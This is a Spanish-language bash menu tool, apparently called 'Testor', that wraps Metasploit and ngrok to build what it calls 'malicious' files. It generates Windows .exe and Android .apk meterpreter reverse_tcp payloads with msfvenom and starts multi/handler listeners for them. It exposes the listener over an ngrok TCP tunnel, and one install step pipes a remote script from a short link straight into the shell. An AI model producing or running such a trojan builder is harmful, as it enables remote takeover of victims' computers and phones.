#!/bin/bash
clear

banner(){
echo
echo
echo "████████╗███████╗░██████╗████████╗░█████╗░██████╗░"
echo "╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗"
echo "░░░██║░░░█████╗░░╚█████╗░░░░██║░░░██║░░██║██████╔╝"
echo "░░░██║░░░██╔══╝░░░╚═══██╗░░░██║░░░██║░░██║██╔══██╗"
echo "░░░██║░░░███████╗██████╔╝░░░██║░░░╚█████╔╝██║░░██║"
echo "░░░╚═╝░░░╚══════╝╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝"
printf "\e[1;93m       .:.:.:.\e[0m\e[1;77m Plumst_37 \e[0m\e[1;93m.:.:.:.\e[0m\n"
}


menu(){
banner
echo
echo
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Descargar herramientas necesarias\e[0m \n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Crear archivo exe malicioso para pc\e[0m \n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m Crear archivo apk malicioso para andorid\e[0m \n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;91m Poner a la escucha del archivo exe\e[0m \n"
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;91m Poner a la escucha del archivo apk\e[0m \n"
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;91m Crear servidor TCP para los archivos o HOST\e[0m  \n"
printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;91m Crear una USB que se ejecute automaticamente\e[0m"
echo
echo
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Seleccione una opción: \e[0m\en' opcion

case $opcion in
  1) install_metasploit ;;
  2) crear_exe ;;
  3) crear_apk;;
  4) escucha_exe;;
  5) esucha_apk;;
  6) activar_servidor;;
  7) USB_AUTORUN ;;
  *) logError "Opción no valida";;
esac

}

install_metasploit(){
clear
banner
echo
echo

printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Descargar en linux\e[0m \n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Descaragar en termux\e[0m \n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m Descaragar Ngrok Linux\e[0m \n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;91m Descaragar Ngrok Termux\e[0m \n"
echo

read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Seleccione una opción: \e[0m\en' opcion

case $opcion in

1) linux_msf;;
2) termux;;
3) ngrok_Linux;;
4) ngrok_Termux;;
esac

}

linux_msf(){

	sudo apt update -y
	sudo apt upgrade -y
	sudo apt install curl
	mkdir msf
	cd msf
		curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  			chmod 755 msfinstall && \
  			./msfinstall

	cd ..
	sudo rm -r msf

}


termux_msf(){

pkg update -y

pkg upgrade -y

chmod +x /termux/requerimientos.sh

read -p "Quieres descargar metasploit(Y/n): " opcion_termux
case $opcion_termux in

[Yy])

termux-setup-storage

pkg update -y
pkg upgrade -y

source <(curl -fsSL https://kutt.it/msf)
;;

[Nn]) continue;;

*) logError "Opción no valida";;

esac

}

ngrok_Linux(){


curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc \
	| sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null \
	&& echo "deb https://ngrok-agent.s3.amazonaws.com buster main" \
	| sudo tee /etc/apt/sources.list.d/ngrok.list \
	&& sudo apt update \
	&& sudo apt install ngrok


read -p "Agrega el Authtoken: " authtoken

ngrok config add-authtoken $authtoken

}

ngrok_Termux(){


apt update -y

apt upgrade -y

git clone https://github.com/venom-24/Tunel-ngrok.git

cd Tunel-ngrok;ls

bash install.sh


read -p "Agrega tu token: " token
ngrok authtoken $token

clear

}

crear_exe(){
clear
cd archivo_exe

banner
    while true; do
        echo -e "\e[31m\e[31mNo agregues el .EXE\e[0m"
        read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Agrega un nombre a tu archivo exe: \e[0m\en' nombre        
clear
banner
        read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Agrega un HOST: \e[0m\en' LHOST
clear
banner
	read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Agrega un puerto: \e[0m\en' LPORT

        clear
banner
        echo -e "Verifica los datos:"
        echo -e "Nombre \e[32m$nombre\e[0m"
        echo -e "LHOST: \e[32m$LHOST\e[0m"
        echo -e "LPORT: \e[32m$LPORT\e[0m"

        read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] los datos estan bien (y/n): \e[0m\en' datos

        case "$datos" in
            [Yy])
                echo -n "Creando .EXE "
                for ((i=1; i<=10; i++)); do  # Ida
                    sleep 0.1
                    echo -n "."
                done
                for ((i=9; i>=1; i--)); do  # Vuelta
                    sleep 0.1
                    echo -n ".."  # Borra el último punto
                done

                msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe > "$nombre".exe

                cd ..
                clear
                break
                ;;
            [Nn])
                clear
                continue
                ;;
	    *) logError "Opción no valida";;
        esac
    done

clear
banner
echo "Solo Termux"
read -p "¿Quieres mover el archivo a la carpeta Download? (y/n):" mover
case $mover in
	[Yy])
 	cp /data/data/com.termux/files/home/Testor/archivo_exe/"$nombre".exe /data/data/com.termux/files/home/storage/downloads/
	echo "El archivo esa en Descargas (Download de tu telefono)"
	;;

	[nN])
	clear
	continue
	;;

	*) logError "Opción no valida";;
esac

echo -e "\e[42mArchivo Creado :)\e[0m"
}


crear_apk() {
    clear
    cd archivo_apk
banner
    while true; do
	echo -e "\e[31m\e[31mNo agregues el .APK\e[0m"
        read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Agrega un nombre a tu archivo APK: \e[0m\en' nombre_apk
        clear
banner
	read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Agrega un HOST: \e[0m\en' LHOST
	clear
banner
	read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Agrega un Puerto: \e[0m\en' LPORT
        clear
banner


        echo -e "Verifica los datos:"
        echo -e "Nombre \e[32m$nombre_apk\e[0m"
        echo -e "LHOST: \e[32m$LHOST\e[0m"
        echo -e "LPORT: \e[32m$LPORT\e[0m"

	read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Los datos están bien (y/n): \e[0m\en' datos

        case "$datos" in
            [Yy])
                echo -n "Creando APK "
                for ((i=1; i<=10; i++)); do  # Ida
                    sleep 0.1
                    echo -n "."
                done
                for ((i=9; i>=1; i--)); do  # Vuelta
                    sleep 0.1
                    echo -n "..."  # Borra el último punto
                done

                msfvenom -p android/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -o "$nombre_apk.apk"
                cd ..
                clear
                echo -e "\e[42mArchivo Creado :)\e[0m"
                break
                ;;
            [Nn])
                clear
                continue
                ;;
            *) logError "Opción no valida";;
        esac
    done

clear
banner
echo "Solo Termux"
read -p "¿Quieres mover el archivo a la carpeta Download? (y/n):" mover_apk
case $mover_apk in
        [Yy])
	cp /data/data/com.termux/files/home/Testor/archivo_apk/"$nombre_apk".apk /data/data/com.termux/files/home/storage/downloads/
        echo "\e[42mEl archivo esa en Descargas (Download de tu telefono)\e[0m"
        ;;

        [nN])
        clear
        continue
        ;;

        *) logError "Opción no valida";;
        esac
echo -e "\e[42mArchivo Creado :)\e[0m"

}
function logError() {
	START='\033[01;31m'
	END='\033[00;00m'
	MESSAGE=${@:-""}
	echo -e "${START}${MESSAGE}${END}"

}


escucha_exe() {
    clear
banner
    while true; do
	read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] HOST del arhivo exe: \e[0m\en' IP
	read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Puerto del archivo exe: \e[0m\en' puerto
        clear
banner
        echo "Verifica los datos:"
        echo "HOST: $IP"
        echo "Puerto: $puerto"

	read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Los datos están bien (y/n): \e[0m\en' datos

        case "$datos" in
            [Yy])
                msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $puerto; exploit"
                break  # Salir del bucle si los datos son correctos
                ;;
            [Nn])
                clear
                continue  # Volver al inicio del bucle para ingresar los datos nuevamente
                ;;
            *) logError "Opción no valida";;
        esac
    done
}


esucha_apk() {
    clear
banner
    while true; do
	read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] HOST del archivo exe: \e[0m\en' IP
	read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Puerto del archivo exe: \e[0m\en' puerto

        clear
banner
        echo "Verifica los datos:"
        echo "HOST: $IP"
        echo "Puerto: $puerto"

	read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Los datos están bien (y/n): \e[0m\en' datos

        case "$datos" in
            [Yy])
                msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $puerto; exploit"
                break  # Salir del bucle si los datos son correctos
                ;;
            [Nn])
                clear
                continue  # Volver al inicio del bucle para ingresar los datos nuevamente
                ;;
            *) logError "Opción no valida";;
        esac
    done
}


activar_servidor(){
clear

banner

read -p "Agrega el puerto que quieres utilizar: " puerto

if command -v ngrok &> /dev/null; then
    # Si está instalado, iniciar ngrok
    ngrok tcp $puerto # Cambia 12345 por el puerto que necesites
else
    # Si no está instalado, mostrar mensaje
    echo "Tienes que instalar ngrok. Ve a la opción 'Descargar herramientas necesarias' para usar esta opción."
fi


}



# Función principal para manejar la creación de autorun en USB
USB_AUTORUN() {
    clear

banner

echo
echo
echo
echo "Esta en matenimiento"
}
# Iniciar la función principal

menu

